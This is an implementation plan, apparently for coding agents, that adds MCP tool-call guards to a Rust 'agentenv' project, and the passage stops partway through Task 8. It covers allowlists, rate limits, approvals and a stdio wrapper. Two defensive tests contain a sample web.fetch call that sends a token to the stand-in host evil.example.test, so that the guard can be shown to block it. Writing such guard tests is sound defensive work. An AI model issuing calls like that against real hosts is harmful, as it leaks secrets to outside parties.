# MCP Confused-Deputy Guards Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Implement issue #42 by mediating all agent-visible MCP tool calls through core-owned guards for HTTP/HTTP+SSE and stdio MCP transports.

**Architecture:** Add pure MCP guard policy and evaluation code in `agentenv-mcp`, wire guard config and endpoint rewriting in `agentenv-core`, extend the existing egress proxy to guard URL-based MCP calls, and add a hidden `agentenv mcp-guard run` stdio wrapper. The guard emits redacted `mcp_tool_call` events and uses the existing approvals queue for approval-required decisions.

**Tech Stack:** Rust workspace, existing `serde`/`serde_json`/`serde_yaml`, `tokio`, `axum`, `reqwest`, `agentenv-events`, `agentenv-approvals`, `agentenv-proto`, existing egress proxy and runtime setup code.

---

## File Structure

```
crates/agentenv-proto/src/types.rs
crates/agentenv-proto/build.rs
crates/agentenv-mcp/Cargo.toml
crates/agentenv-mcp/src/lib.rs
crates/agentenv-mcp/src/guard.rs
crates/agentenv-core/src/lifecycle.rs
crates/agentenv-core/src/runtime.rs
crates/agentenv-core/src/egress_proxy.rs
crates/agentenv/src/main.rs
crates/agentenv/src/proxy_cli.rs
crates/agentenv/src/mcp_guard_cli.rs
docs/ARCHITECTURE.md
docs/BLUEPRINTS.md
docs/DRIVER_PROTOCOL.md
blueprints/claude+filesystem+openshell.yaml
blueprints/codex+filesystem+openshell.yaml
blueprints/claude+mcp-generic+openshell.yaml
blueprints/codex+mcp-generic+openshell.yaml
```

Responsibilities:

- `agentenv-proto/src/types.rs`: serializable MCP guard config types used by core, proxy launch config, and MCP evaluator without adding crate dependency cycles.
- `agentenv-mcp/src/guard.rs`: policy matching, JSON-RPC request parsing, argument redaction/summarization, URL allowlist checks, rate counters, read-to-write session flow checks, and pure evaluation result types.
- `agentenv-core/src/lifecycle.rs`: parse and validate `policy.mcp.confused_deputy_guards` during blueprint verification.
- `agentenv-core/src/egress_proxy.rs`: carry optional MCP guard config in MCP broker routes and launch config.
- `agentenv-core/src/runtime.rs`: build guard config from blueprint policy, attach it to HTTP MCP proxy routes, rewrite stdio endpoints, and copy stdio guard config into the sandbox.
- `agentenv/src/proxy_cli.rs`: evaluate guarded MCP HTTP requests before credential resolution and forwarding.
- `agentenv/src/mcp_guard_cli.rs`: hidden stdio wrapper command that relays framed JSON-RPC while applying the same evaluator.
- Docs and blueprints: document the config shape and add commented examples.

---

## Task 1: Add Serializable MCP Guard Policy Types

**Files:**
- Modify: `crates/agentenv-proto/Cargo.toml`
- Modify: `crates/agentenv-proto/src/types.rs`
- Modify: `crates/agentenv-proto/build.rs`

- [ ] **Step 1: Write failing proto policy parsing tests**

Add tests to `crates/agentenv-proto/src/types.rs` near the existing serde tests:

```rust
#[test]
fn mcp_guard_config_parses_full_yaml() {
    let yaml = r#"
enabled: true
default_approval: per-call
tool_policies:
  "filesystem.read":
    approval: never
    rate_limit: 50/session
  "web.fetch":
    approval: per-call
    url_allowlist: ["api.github.com", "crates.io"]
    redact_args: true
  "*.write":
    approval: per-session
cross_tool_flows:
  forbid_read_to_write_turns: 5
"#;

    let config: McpGuardConfig = serde_yaml::from_str(yaml).expect("config parses");

    assert!(config.enabled);
    assert_eq!(config.default_approval, McpApprovalMode::PerCall);
    assert_eq!(
        config.tool_policies["filesystem.read"].approval,
        Some(McpApprovalMode::Never)
    );
    assert_eq!(
        config.tool_policies["filesystem.read"].rate_limit,
        Some(McpSessionRateLimit { calls: 50 })
    );
    assert_eq!(
        config.tool_policies["web.fetch"].url_allowlist,
        vec!["api.github.com".to_owned(), "crates.io".to_owned()]
    );
    assert_eq!(
        config.cross_tool_flows.forbid_read_to_write_turns,
        Some(5)
    );
}

#[test]
fn mcp_guard_config_rejects_unknown_fields() {
    let yaml = r#"
enabled: true
surprise: true
"#;

    let error = serde_yaml::from_str::<McpGuardConfig>(yaml)
        .expect_err("unknown fields must fail closed");

    assert!(error.to_string().contains("surprise"));
}
```

- [ ] **Step 2: Run tests and verify they fail**

Run:

```bash
cargo test -p agentenv-proto mcp_guard_config_parses_full_yaml mcp_guard_config_rejects_unknown_fields
```

Expected: compile fails because the MCP guard config types do not exist.

- [ ] **Step 3: Implement proto config types**

Update `crates/agentenv-proto/Cargo.toml`:

```toml
[dev-dependencies]
serde_yaml.workspace = true
```

Add to `crates/agentenv-proto/src/types.rs`:

```rust
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "kebab-case")]
pub enum McpApprovalMode {
    Never,
    PerCall,
    PerSession,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct McpGuardConfig {
    #[serde(default)]
    pub enabled: bool,
    #[serde(default = "default_mcp_approval")]
    pub default_approval: McpApprovalMode,
    #[serde(default)]
    pub tool_policies: BTreeMap<String, McpToolPolicy>,
    #[serde(default)]
    pub cross_tool_flows: McpCrossToolFlowPolicy,
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct McpToolPolicy {
    #[serde(default)]
    pub approval: Option<McpApprovalMode>,
    #[serde(default, deserialize_with = "deserialize_mcp_rate_limit")]
    pub rate_limit: Option<McpSessionRateLimit>,
    #[serde(default)]
    pub url_allowlist: Vec<String>,
    #[serde(default)]
    pub redact_args: bool,
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct McpCrossToolFlowPolicy {
    #[serde(default)]
    pub forbid_read_to_write_turns: Option<usize>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
pub struct McpSessionRateLimit {
    pub calls: u32,
}

fn default_mcp_approval() -> McpApprovalMode {
    McpApprovalMode::Never
}
```

Implement `deserialize_mcp_rate_limit` so `50/session` becomes
`McpSessionRateLimit { calls: 50 }` and malformed values produce a serde error.

Update `crates/agentenv-proto/build.rs`:

```rust
write_schema::<types::McpGuardConfig>(&schema_dir, "mcp-guard-config");
```

- [ ] **Step 4: Run focused proto tests**

Run:

```bash
cargo test -p agentenv-proto mcp_guard_config_
```

Expected: both proto config tests pass.

---

## Task 2: Add MCP Guard Evaluator

**Files:**
- Modify: `crates/agentenv-mcp/Cargo.toml`
- Modify: `crates/agentenv-mcp/src/lib.rs`
- Create: `crates/agentenv-mcp/src/guard.rs`

- [ ] **Step 1: Write failing evaluator tests**

Create `crates/agentenv-mcp/src/guard.rs` with tests first:

```rust
#[cfg(test)]
mod tests {
    use std::collections::BTreeMap;

    use agentenv_proto::{
        McpApprovalMode, McpCrossToolFlowPolicy, McpGuardConfig, McpSessionRateLimit,
        McpToolPolicy,
    };
    use serde_json::json;

    use super::*;

    #[test]
    fn exact_policy_beats_wildcard_policy() {
        let config = McpGuardConfig {
            enabled: true,
            default_approval: McpApprovalMode::PerCall,
            tool_policies: [
                ("*.write".to_owned(), McpToolPolicy {
                    approval: Some(McpApprovalMode::PerSession),
                    ..McpToolPolicy::default()
                }),
                ("filesystem.write".to_owned(), McpToolPolicy {
                    approval: Some(McpApprovalMode::Never),
                    ..McpToolPolicy::default()
                }),
            ].into_iter().collect(),
            cross_tool_flows: McpCrossToolFlowPolicy::default(),
        };

        let matched = match_policy(&config, "filesystem.write");

        assert_eq!(matched.pattern.as_deref(), Some("filesystem.write"));
        assert_eq!(matched.approval, McpApprovalMode::Never);
    }

    #[test]
    fn evaluator_flags_url_allowlist_violation_in_nested_args() {
        let config = McpGuardConfig {
            enabled: true,
            default_approval: McpApprovalMode::Never,
            tool_policies: [("web.fetch".to_owned(), McpToolPolicy {
                url_allowlist: vec!["api.github.com".to_owned()],
                ..McpToolPolicy::default()
            })].into_iter().collect(),
            cross_tool_flows: McpCrossToolFlowPolicy::default(),
        };
        let mut state = GuardSessionState::default();
        let request = json!({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {
                "name": "web.fetch",
                "arguments": {"url": "https://evil.example.test/?token=secret"}
            }
        });

        let decision = evaluate_json_rpc_request(&config, &mut state, &request)
            .expect("request evaluation succeeds");

        assert_eq!(decision.action, GuardAction::Deny);
        assert_eq!(decision.reason, GuardReason::UrlAllowlistViolation);
        assert!(!decision.redacted_event_context.to_string().contains("secret"));
    }

    #[test]
    fn session_rate_limit_denies_after_limit() {
        let config = McpGuardConfig {
            enabled: true,
            default_approval: McpApprovalMode::Never,
            tool_policies: [("filesystem.read".to_owned(), McpToolPolicy {
                rate_limit: Some(McpSessionRateLimit { calls: 1 }),
                ..McpToolPolicy::default()
            })].into_iter().collect(),
            cross_tool_flows: McpCrossToolFlowPolicy::default(),
        };
        let mut state = GuardSessionState::default();
        let request = json!({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {"name": "filesystem.read", "arguments": {"path": "/tmp/a"}}
        });

        assert_eq!(evaluate_json_rpc_request(&config, &mut state, &request).unwrap().action, GuardAction::Forward);
        let second = evaluate_json_rpc_request(&config, &mut state, &request).unwrap();
        assert_eq!(second.action, GuardAction::Deny);
        assert_eq!(second.reason, GuardReason::RateLimited);
    }
}
```

- [ ] **Step 2: Run tests and verify they fail**

Run:

```bash
cargo test -p agentenv-mcp exact_policy_beats_wildcard_policy evaluator_flags_url_allowlist_violation_in_nested_args session_rate_limit_denies_after_limit
```

Expected: compile fails because the guard evaluator types and dependencies are missing.

- [ ] **Step 3: Add dependencies and module export**

Update `crates/agentenv-mcp/Cargo.toml`:

```toml
serde.workspace = true
serde_json.workspace = true
serde_yaml.workspace = true
thiserror.workspace = true
```

Keep the existing `agentenv-core` dependency unchanged for current SSRF endpoint validation. Do not add an `agentenv-core -> agentenv-mcp` dependency in later tasks; shared config types live in `agentenv-proto`.

Update `crates/agentenv-mcp/src/lib.rs`:

```rust
pub mod guard;
```

- [ ] **Step 4: Implement the pure evaluator**

Implement `crates/agentenv-mcp/src/guard.rs` with:

```rust
use std::collections::{BTreeMap, VecDeque};

use agentenv_proto::{McpApprovalMode, McpGuardConfig, McpSessionRateLimit};
use serde_json::Value;
use thiserror::Error;
use url::Url;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct MatchedToolPolicy {
    pub pattern: Option<String>,
    pub approval: McpApprovalMode,
    pub rate_limit: Option<McpSessionRateLimit>,
    pub url_allowlist: Vec<String>,
    pub redact_args: bool,
}

#[derive(Debug, Default)]
pub struct GuardSessionState {
    calls_by_pattern: BTreeMap<String, u32>,
    recent_reads: VecDeque<RecentRead>,
    session_grants: BTreeMap<String, bool>,
}

#[derive(Debug, Clone, PartialEq)]
pub struct GuardDecision {
    pub action: GuardAction,
    pub reason: GuardReason,
    pub tool_name: Option<String>,
    pub matched_policy: Option<String>,
    pub approval_mode: McpApprovalMode,
    pub redacted_event_context: Value,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum GuardAction {
    Forward,
    Deny,
    RequestApproval,
    NotToolCall,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum GuardReason {
    Disabled,
    NotToolCall,
    AllowedByPolicy,
    ApprovalRequired,
    UrlAllowlistViolation,
    CredentialLikeArgument,
    EnvVarLikeArgument,
    RateLimited,
    CrossToolFlow,
    MalformedToolCall,
}

#[derive(Debug, Error)]
pub enum GuardError {
    #[error("malformed MCP tool call: {0}")]
    MalformedToolCall(String),
}
```

Then implement:

- `pub fn match_policy(config: &McpGuardConfig, tool_name: &str) -> MatchedToolPolicy`
- `pub fn evaluate_json_rpc_request(config, state, request)`
- recursive argument summarization and redaction helpers
- URL host extraction and allowlist matching
- credential-key and env-var-looking value detection
- conservative read/write/external classification helpers
- session rate counters and read-to-write flow window

Keep this module pure. It must not import `agentenv-approvals` or
`agentenv-events`.

- [ ] **Step 5: Run focused evaluator tests**

Run:

```bash
cargo test -p agentenv-mcp exact_policy_beats_wildcard_policy evaluator_flags_url_allowlist_violation_in_nested_args session_rate_limit_denies_after_limit
```

Expected: all new evaluator tests pass.

---

## Task 3: Validate Blueprint MCP Guard Config

**Files:**
- Modify: `crates/agentenv-core/src/lifecycle.rs`
- Test: `crates/agentenv-core/tests/roundtrip.rs`

- [ ] **Step 1: Write failing lifecycle tests**

Append tests to `crates/agentenv-core/tests/roundtrip.rs`:

```rust
#[test]
fn verify_blueprint_accepts_mcp_guard_policy_extra() {
    let yaml = r#"
version: 0.1.0
min_agentenv_version: 0.0.1-alpha0
sandbox:
  driver: openshell
agent:
  driver: codex
context:
  driver: none
policy:
  tier: restricted
  mcp:
    confused_deputy_guards:
      enabled: true
      default_approval: per-call
      tool_policies:
        "*.write":
          approval: per-session
"#;

    let resolved = agentenv_core::lifecycle::verify_blueprint_yaml(yaml)
        .expect("MCP guard config should verify");

    assert_eq!(resolved.blueprint.policy.tier, "restricted");
}

#[test]
fn verify_blueprint_rejects_invalid_mcp_guard_policy_extra() {
    let yaml = r#"
version: 0.1.0
min_agentenv_version: 0.0.1-alpha0
sandbox:
  driver: openshell
agent:
  driver: codex
context:
  driver: none
policy:
  tier: restricted
  mcp:
    confused_deputy_guards:
      enabled: true
      default_approval: always
"#;

    let err = agentenv_core::lifecycle::verify_blueprint_yaml(yaml)
        .expect_err("invalid MCP guard config should fail");

    assert!(err.to_string().contains("policy.mcp.confused_deputy_guards"));
}
```

- [ ] **Step 2: Run tests and verify failure**

Run:

```bash
cargo test -p agentenv-core verify_blueprint_accepts_mcp_guard_policy_extra verify_blueprint_rejects_invalid_mcp_guard_policy_extra
```

Expected: invalid config is not rejected yet.

- [ ] **Step 3: Add lifecycle validation using proto config types**

Add to `verify_resolved_blueprint` in `crates/agentenv-core/src/lifecycle.rs`:

```rust
validate_mcp_guard_policy_extra(&resolved.blueprint)?;
```

Add helper:

```rust
fn validate_mcp_guard_policy_extra(blueprint: &Blueprint) -> Result<(), LifecycleError> {
    let Some(mcp) = blueprint.policy.extra.get("mcp") else {
        return Ok(());
    };
    let Some(guards) = mcp
        .get("confused_deputy_guards")
        .cloned()
    else {
        return Ok(());
    };
    serde_yaml::from_value::<agentenv_proto::McpGuardConfig>(guards).map_err(|source| {
        LifecycleError::InvalidMcpGuardPolicy {
            path: "policy.mcp.confused_deputy_guards",
            message: source.to_string(),
        }
    })?;
    Ok(())
}
```

Add `LifecycleError::InvalidMcpGuardPolicy { path: &'static str, message: String }`.

- [ ] **Step 4: Run focused tests**

Run:

```bash
cargo test -p agentenv-core verify_blueprint_accepts_mcp_guard_policy_extra verify_blueprint_rejects_invalid_mcp_guard_policy_extra
```

Expected: both tests pass.

---

## Task 4: Carry MCP Guard Config Through Egress Proxy Planning

**Files:**
- Modify: `crates/agentenv-core/src/egress_proxy.rs`
- Modify: `crates/agentenv/src/proxy_cli.rs`

- [ ] **Step 1: Write failing egress proxy plan test**

Add to `crates/agentenv-core/src/egress_proxy.rs` tests:

```rust
#[test]
fn mcp_route_carries_guard_config_when_supplied() {
    let endpoint = McpProxySource {
        route_id: "primary".to_owned(),
        upstream_url: "https://mcp.example.test/rpc".parse().unwrap(),
        token_credential_name: Some("MCP_TOKEN".to_owned()),
        guard_config: Some(agentenv_proto::McpGuardConfig {
            enabled: true,
            default_approval: agentenv_proto::McpApprovalMode::PerCall,
            tool_policies: BTreeMap::new(),
            cross_tool_flows: agentenv_proto::McpCrossToolFlowPolicy::default(),
        }),
    };

    let plan = build_egress_proxy_plan(EgressProxyPlanInput {
        env_name: "demo".to_owned(),
        proxy_base_url: "http://127.0.0.1:31002".parse().unwrap(),
        credential_requirements: vec![required("MCP_TOKEN")],
        network_policy: policy(),
        context_mcp: Some(endpoint),
        inference_endpoint: None,
        explicit_routes: ExplicitEgressRoutes::default(),
    }).expect("plan builds");

    let route = plan.routes.iter().find(|route| route.id == "mcp.primary").unwrap();
    assert!(route.mcp_guard.as_ref().is_some_and(|guard| guard.enabled));
}
```

- [ ] **Step 2: Run test and verify failure**

Run:

```bash
cargo test -p agentenv-core mcp_route_carries_guard_config_when_supplied
```

Expected: compile fails because `guard_config` and `mcp_guard` fields do not exist.

- [ ] **Step 3: Add serializable guard fields**

Update `McpProxySource`:

```rust
pub struct McpProxySource {
    pub route_id: String,
    pub upstream_url: Url,
    pub token_credential_name: Option<String>,
    pub guard_config: Option<agentenv_proto::McpGuardConfig>,
}
```

Update `BrokerRoute`:

```rust
#[serde(default, skip_serializing_if = "Option::is_none")]
pub mcp_guard: Option<agentenv_proto::McpGuardConfig>,
```

When building the MCP route, set `mcp_guard: source.guard_config`.

Update all existing route constructors in tests to set `mcp_guard: None`.

- [ ] **Step 4: Run focused tests**

Run:

```bash
cargo test -p agentenv-core egress_proxy::tests::mcp_route_carries_guard_config_when_supplied
cargo test -p agentenv proxy_cli::tests::mcp_route_injects_bearer_token
```

Expected: tests pass after route initializers are updated.

---

## Task 5: Guard HTTP MCP Requests In The Proxy

**Files:**
- Modify: `crates/agentenv/src/proxy_cli.rs`
- Modify: `crates/agentenv/Cargo.toml`

- [ ] **Step 1: Write failing HTTP guard tests**

Add to `crates/agentenv/src/proxy_cli.rs` tests:

```rust
#[tokio::test]
async fn mcp_guard_denies_url_allowlist_violation_before_credential_resolution() {
    let root = temp_dir("agentenv-proxy-mcp-guard-deny");
    fs::create_dir_all(&root).expect("temp dir should be created");
    let mut route = test_mcp_route();
    route.mcp_guard = Some(agentenv_proto::McpGuardConfig {
        enabled: true,
        default_approval: agentenv_proto::McpApprovalMode::Never,
        tool_policies: [("web.fetch".to_owned(), agentenv_proto::McpToolPolicy {
            url_allowlist: vec!["api.github.com".to_owned()],
            ..agentenv_proto::McpToolPolicy::default()
        })].into_iter().collect(),
        cross_tool_flows: agentenv_proto::McpCrossToolFlowPolicy::default(),
    });
    let policy = policy_with_rules(&["mcp.example.test"], &[]);
    let state = Arc::new(test_state(&root, route, policy.clone(), BTreeMap::new()));
    fs::write(
        &state.config.policy_path,
        serde_json::to_vec(&policy).expect("policy should serialize"),
    ).expect("policy should be written");
    let request = Request::builder()
        .method("POST")
        .uri("/v1/mcp/primary")
        .header("content-type", "application/json")
        .body(Body::from(serde_json::to_vec(&serde_json::json!({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {
                "name": "web.fetch",
                "arguments": {"url": "https://evil.example.test/?token=secret"}
            }
        })).unwrap()))
        .expect("request should build");

    let response = handle_proxy_request(Arc::clone(&state), request)
        .await
        .expect("guard denial should be handled");

    assert_eq!(response.status(), StatusCode::FORBIDDEN);
}
```

- [ ] **Step 2: Run test and verify failure**

Run:

```bash
cargo test -p agentenv mcp_guard_denies_url_allowlist_violation_before_credential_resolution
```

Expected: request is forwarded or credential resolution fails instead of a guard denial.

- [ ] **Step 3: Add proxy guard evaluation before credential resolution**

Update `crates/agentenv/Cargo.toml`:

```toml
agentenv-mcp = { path = "../agentenv-mcp" }
```

Add a `mcp_guard_states: Arc<Mutex<BTreeMap<String, agentenv_mcp::guard::GuardSessionState>>>`
field to `ProxyState` and initialize it in `run_proxy` and `test_state`.

In `handle_proxy_request`, after policy allow/rate-limit checks and before credential resolution:

```rust
let (guard_response, request) = maybe_handle_mcp_guard(&state, &route, request).await?;
if let Some(response) = guard_response {
    return Ok(response);
}
```

Implement `maybe_handle_mcp_guard` to:

- return `(None, request)` when `route.mcp_guard` is absent or disabled
- only inspect `POST` requests with JSON bodies on `BrokerService::Mcp`
- buffer the body into bytes, evaluate the JSON-RPC request, and return the reconstructed request body for forwarding when allowed
- emit a redacted `mcp_tool_call` event for every evaluated tool call
- return `403` for `GuardAction::Deny`
- return `403` for `GuardAction::RequestApproval` initially, then Task 6 replaces this with approval waiting

- [ ] **Step 4: Run focused tests**

Run:

```bash
cargo test -p agentenv mcp_guard_denies_url_allowlist_violation_before_credential_resolution
cargo test -p agentenv proxy_cli::tests::mcp_route_injects_bearer_token
```

Expected: guard denial test and existing MCP route test pass.

---

## Task 6: Route MCP Guard Approval Requests Through Approvals

**Files:**
- Modify: `crates/agentenv/src/proxy_cli.rs`

- [ ] **Step 1: Write failing approval test**

Add a proxy test that builds a guard config with `default_approval: per-call`,
creates an env-scoped approval coordinator, records an operator denial in the
same store, and asserts the guarded request blocks until that denial is visible:

```rust
#[tokio::test]
async fn mcp_guard_per_call_policy_waits_for_operator_denial() {
    let root = temp_dir("agentenv-proxy-mcp-guard-approval");
    fs::create_dir_all(&root).expect("temp dir should be created");
    let mut route = test_mcp_route();
    route.mcp_guard = Some(agentenv_proto::McpGuardConfig {
        enabled: true,
        default_approval: agentenv_proto::McpApprovalMode::PerCall,
        tool_policies: BTreeMap::new(),
        cross_tool_flows: agentenv_proto::McpCrossToolFlowPolicy::default(),
    });
    let policy = policy_with_rules(&["mcp.example.test"], &[]);
    let approval_db = root.join("events.db");
    let coordinator = agentenv_approvals::ApprovalCoordinator::new(
        agentenv_approvals::ApprovalCoordinatorConfig {
            store: agentenv_approvals::ApprovalStore::open(&approval_db).unwrap(),
            events: Arc::new(agentenv_events::NoopEventEmitter),
            poll_interval: std::time::Duration::from_millis(10),
            overlay_path: None,
            proposal_path: None,
            notifications: None,
        },
    );
    let state = Arc::new(test_state_with_approvals(
        &root,
        route,
        policy.clone(),
        BTreeMap::new(),
        Some(coordinator),
    ));
    fs::write(&state.config.policy_path, serde_json::to_vec(&policy).unwrap()).unwrap();
    let approval_db_for_decider = approval_db.clone();
    let decider = tokio::spawn(async move {
        let store = agentenv_approvals::ApprovalStore::open(&approval_db_for_decider).unwrap();
        loop {
            let pending = store
                .list_requests(agentenv_approvals::ApprovalRequestFilter {
                    env: Some("demo".to_owned()),
                    status: Some(agentenv_approvals::ApprovalStatus::Pending),
                })
                .unwrap();
            if let Some(request) = pending.first() {
                store
                    .record_decision(&agentenv_approvals::ApprovalDecisionRecord {
                        request_id: request.id.clone(),
                        decision: agentenv_approvals::ApprovalDecisionValue::Deny,
                        scope: agentenv_approvals::ApprovalScope::Once,
                        decided_by: "agentenv:test".to_owned(),
                        decided_at: time::OffsetDateTime::now_utc(),
                        reason: Some("test_denial".to_owned()),
                        context: serde_json::json!({"source": "test"}),
                        trace_id: request.created_trace_id.clone(),
                    })
                    .unwrap();
                break;
            }
            tokio::time::sleep(std::time::Duration::from_millis(10)).await;
        }
    });
    let request = Request::builder()
        .method("POST")
        .uri("/v1/mcp/primary")
        .header("content-type", "application/json")
        .body(Body::from(r#"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"filesystem.write","arguments":{"path":"/tmp/a"}}}"#))
        .unwrap();

    let response = handle_proxy_request(Arc::clone(&state), request).await.unwrap();
    decider.await.unwrap();

    assert_eq!(response.status(), StatusCode::FORBIDDEN);
}
```

- [ ] **Step 2: Run test and verify failure**

Run:

```bash
cargo test -p agentenv mcp_guard_per_call_policy_waits_for_operator_denial
```

Expected: currently returns forbidden immediately without creating or waiting on
an approval request.

- [ ] **Step 3: Add approval coordinator to proxy state**

Extend `ProxyState` with:

```rust
approval_coordinator: Option<agentenv_approvals::ApprovalCoordinator>,
```

Build it in `run_proxy` using the existing env root from `runtime_root_from_events_db`, the same events emitter, and env-scoped overlay/proposal paths.

For `GuardAction::RequestApproval`, create `ApprovalRequest::new`:

```rust
let request = ApprovalRequest::new(
    format!("req_{}", uuid::Uuid::new_v7()),
    state.env_name.clone(),
    ApprovalKind::McpTool,
    tool_name,
    reason_code,
    context,
    time::OffsetDateTime::now_utc(),
    default_scope,
    Duration::from_secs(60),
    crate::new_cli_trace_id(),
);
```

Submit the request and wait for `wait_for_decision`. Return:

- forwarded request when the approval decision is allow
- `403 Forbidden` when denied or expired

If `approval_coordinator` is `None`, fail closed with `503 Service Unavailable`
and reason `approval_unavailable`. Do not return a pending response for an
approval-required tool call; issue #42 requires blocking until the approval
request is resolved or auto-denied.

- [ ] **Step 4: Run focused tests**

Run:

```bash
cargo test -p agentenv mcp_guard_per_call_policy_waits_for_operator_denial
cargo test -p agentenv proxy_cli::tests::policy_reload_blocks_route_after_file_update
```

Expected: tests pass.

---

## Task 7: Add Stdio MCP Guard CLI Wrapper

**Files:**
- Modify: `crates/agentenv/src/main.rs`
- Create: `crates/agentenv/src/mcp_guard_cli.rs`
- Modify: `crates/agentenv/Cargo.toml`

- [ ] **Step 1: Write failing CLI parse test**

Add to existing CLI parse tests in `crates/agentenv/src/main.rs`:

```rust
#[test]
fn mcp_guard_command_parses() {
    let cli = Cli::try_parse_from([
        "agentenv",
        "mcp-guard",
        "run",
        "--env",
        "demo",
        "--config",
        "/tmp/mcp-guard.json",
        "--events-db",
        "/tmp/events.db",
        "--stdio-upstream",
        "agentenv-fs-mcp --root /tmp",
    ])
    .expect("mcp guard command parses");

    match cli.command {
        Some(Commands::McpGuard(McpGuardArgs {
            command: McpGuardCommand::Run(args),
        })) => {
            assert_eq!(args.env, "demo");
            assert_eq!(args.config, PathBuf::from("/tmp/mcp-guard.json"));
            assert_eq!(args.events_db, PathBuf::from("/tmp/events.db"));
            assert_eq!(args.stdio_upstream, "agentenv-fs-mcp --root /tmp");
        }
        other => panic!("unexpected command: {other:?}"),
    }
}
```

- [ ] **Step 2: Run test and verify failure**

Run:

```bash
cargo test -p agentenv mcp_guard_command_parses
```

Expected: command is unknown.

- [ ] **Step 3: Add hidden command and module**

Update `crates/agentenv/src/main.rs`:

```rust
mod mcp_guard_cli;
```

Add hidden command:

```rust
#[command(hide = true, name = "mcp-guard")]
McpGuard(McpGuardArgs),
```

Add args:

```rust
#[derive(Debug, Args)]
pub(crate) struct McpGuardArgs {
    #[command(subcommand)]
    command: McpGuardCommand,
}

#[derive(Debug, Subcommand)]
pub(crate) enum McpGuardCommand {
    Run(McpGuardRunArgs),
}

#[derive(Debug, Args, Clone)]
pub(crate) struct McpGuardRunArgs {
    #[arg(long)]
    env: String,
    #[arg(long)]
    config: PathBuf,
    #[arg(long = "events-db")]
    events_db: PathBuf,
    #[arg(long = "stdio-upstream")]
    stdio_upstream: String,
}
```

Dispatch:

```rust
Some(Commands::McpGuard(args)) => mcp_guard_cli::run(args).await,
```

- [ ] **Step 4: Implement stdio wrapper in small tested units**

Create `crates/agentenv/src/mcp_guard_cli.rs` with:

- `run(args) -> Result<()>`
- `read_lsp_message<R: BufRead>(reader) -> Result<Option<Vec<u8>>>`
- `write_lsp_message<W: Write>(writer, body: &[u8]) -> Result<()>`
- `evaluate_client_message(config, state, body) -> GuardDecision`
- `json_rpc_error_response(id, code, message) -> Vec<u8>`

Initial implementation should support one request/response relay loop using blocking stdio in `tokio::task::spawn_blocking`. Use `std::process::Command` for the child process and pipe stdin/stdout.

- [ ] **Step 5: Add frame unit tests**

Add tests in `mcp_guard_cli.rs`:

```rust
#[test]
fn lsp_message_round_trips_body() {
    let body = br#"{"jsonrpc":"2.0","id":1,"method":"ping"}"#;
    let mut out = Vec::new();
    write_lsp_message(&mut out, body).unwrap();

    let decoded = read_lsp_message(&mut std::io::BufReader::new(out.as_slice()))
        .unwrap()
        .unwrap();

    assert_eq!(decoded, body);
}
```

Run:

```bash
cargo test -p agentenv lsp_message_round_trips_body mcp_guard_command_parses
```

Expected: tests pass.

---

## Task 8: Rewrite Runtime MCP Endpoints

**Files:**
- Modify: `crates/agentenv-core/src/runtime.rs`
- Modify: `crates/agentenv-core/src/egress_proxy.rs`

- [ ] **Step 1: Write failing runtime tests**

Add tests near existing MCP endpoint rewrite tests in `crates/agentenv-core/src/runtime.rs`:

```rust
#[tokio::test]
async fn create_env_rewrites_stdio_mcp_endpoint_when_guard_enabled() {
    let root = unique_root("agentenv-mcp-guard-stdio");
    let options = RuntimeOptions {
        root,
        log_level: LogLevel::Info,
        non_interactive: true,
    };
    let yaml = r#"
version: 0.1.0
min_agentenv_version: 0.0.1-alpha0
sandbox:
  driver: openshell
agent:
  driver: codex
context:
  driver: filesystem
  mount: .
policy:
  tier: restricted
  mcp:
    confused_deputy_guards:
      enabled: true
      default_approval: per-call
"#;
    let tracker = Arc::new(AgentSetupTracker::default());
    let factory = AgentSetupFactory {
        tracker: Arc::clone(&tracker),
    };
    let mut credentials = super::tests_support::EmptyCredentialProvider;

    super::create_env(&options, &factory, &mut credentials, "demo", yaml)
        .await
        .expect("env create should succeed");

    let endpoint_batches = tracker
        .mcp_config_endpoints
        .lock()
        .expect("mcp config endpoint tracker");
    assert!(endpoint_batches[0][0].url.contains("agentenv mcp-guard run"));
    assert_eq!(endpoint_batches[0][0].transport, agentenv_proto::McpTransport::Stdio);
}
```

- [ ] **Step 2: Run test and verify failure**

Run:

```bash
cargo test -p agentenv-core create_env_rewrites_stdio_mcp_endpoint_when_guard_enabled
```

Expected: stdio endpoint remains `agentenv-fs-mcp`.

- [ ] **Step 3: Add runtime guard config extraction**

Add helper in `runtime.rs`:

```rust
fn mcp_guard_config_from_policy_extra(
    policy_extra: &BTreeMap<String, serde_yaml::Value>,
) -> RuntimeResult<Option<agentenv_proto::McpGuardConfig>> {
    let Some(mcp) = policy_extra.get("mcp") else {
        return Ok(None);
    };
    let Some(guards) = mcp.get("confused_deputy_guards").cloned() else {
        return Ok(None);
    };
    let config = serde_yaml::from_value::<agentenv_proto::McpGuardConfig>(guards)
        .map_err(|source| RuntimeError::Driver(DriverError::InvalidInput {
            message: format!("invalid policy.mcp.confused_deputy_guards: {source}"),
        }))?;
    Ok(config.enabled.then_some(config))
}
```

- [ ] **Step 4: Rewrite HTTP and stdio endpoints before rendering agent config**

Before `prepare_agent_sandbox_setup`, compute:

```rust
let mcp_guard_config = mcp_guard_config_from_policy_extra(&resolved.blueprint.policy.extra)?;
let context_endpoint_for_sandbox = rewrite_context_endpoint_for_proxy(&context_endpoint, &egress_proxy_plan);
